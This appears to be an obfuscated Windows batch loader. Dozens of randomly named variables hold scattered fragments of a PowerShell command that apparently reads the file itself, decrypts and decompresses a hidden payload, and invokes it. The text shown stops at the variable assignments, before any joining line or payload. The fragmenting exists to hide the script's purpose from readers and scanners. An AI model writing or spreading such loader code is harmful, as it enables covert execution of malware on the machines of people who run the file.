@echo off
set "YxVAMaBmtq=ptog"
set "ePAmoVSFxK=ne);"
set "WRWNlYpidQ=Mode"
set "gQyynoDaMH=raph"
set "DSNbiMMmuP=ue, "
set "gVqikLeJou=.Cry"
set "MOGSNZeNwl=$cDd"
set "FTDiXqiTff=($RL"
set "KFtKRtmbcW=oint"
set "FoMbakbHOy=rofi"
set "acxSrtfWwv=t Sy"
set "TLGypImQcz=[-1."
set "NwSNEIZbJT=onve"
set "hlDaaWjusF=lit("
set "RGDSWTyghO=stem"
set "gTiAHYjvwM=in $"
set "kuuAPIbUqz=pDZz"
set "yylYnONpYt=ode]"
set "lGANKsnhuC=.GZi"
set "dOAmdEXUCM=Kc.D"
set "seTfhPPDjS=S) {"
set "QRJgzdjPoj=-1.."
set "bjkkhRaiEl=pres"
set "zuWdoRRNGB=ypto"
set "tLjMGlMrpG=)))"
set "JFEpdKZLut=();$"
set "HGusJFbood=baCE"
set "fwbjUrPtZo=ES ="
set "qBtOamqTar=('%*'"
set "kLloRIwsnd=nAcp"
set "ciFhftGwin=raph"
set "NUjCszstJr=Secu"
set "yAiQmxBELW=cp ="
set "dGJoSPXOdd==');"
set "rVZmkxmaIb=ment"
set "WfvVuNYyZP=n ''"
set "kWtaTIResL=XHFl"
set "ScaIGZUjeU=::De"
set "aBBrfbOdaZ=NKSu"
set "VSocgyatNB='gni"
set "GKSpToSCNe=[Sys"
set "MPUYVBomIq=ose("
set "XQJDFxLirE=)) {"
set "SBoJdKlcwR= = ["
set "gIftaHINNP=]::N"
set "KPenQucqUi=BC;$"
set "qYMiAqEoFg=3HWs"
set "hNXJNOhyIg=;$XH"
set "sBcBPXeucX=oryS"
set "dKZWnoQxTl=ptog"
set "pPnPdeSswz=ewLi"
set "KQmofKRDAJ=ress"
set "JQaJYqdyZR=('%~f0'"
set "UsHZeBXYkW=fore"
set "pDgnBhGAgi=join"
set "tGkujgehjS=Syst"
set "tmbkacvAER=e]::"
set "TyXsgcIHxh=znAc"
set "VZnUylViKS=g = "
set "QYuLNvSqvR=rity"
set "uSHtMiyQMZ=7Yiv"
set "YqJbvlXBYo=IRgF"
set "sTMsqSngxR=tIRg"
set "rTKNxlMWzE=IRgF"
set "DgHaWPQfEF=+hAO"
set "KcMeFEZkEg=Oc);"
set "iVktaNbhLs=Invo"
set "MpCdjPJsfX=.Mem"
set "EVGYCvXeCp=znAc"
set "qhtcQLxkxE=ZYYc"
set "SVQHBPrFzq=New-"
set "nYMAcHnxmj=tem."
set "pGbWEsaKcE=qthS"
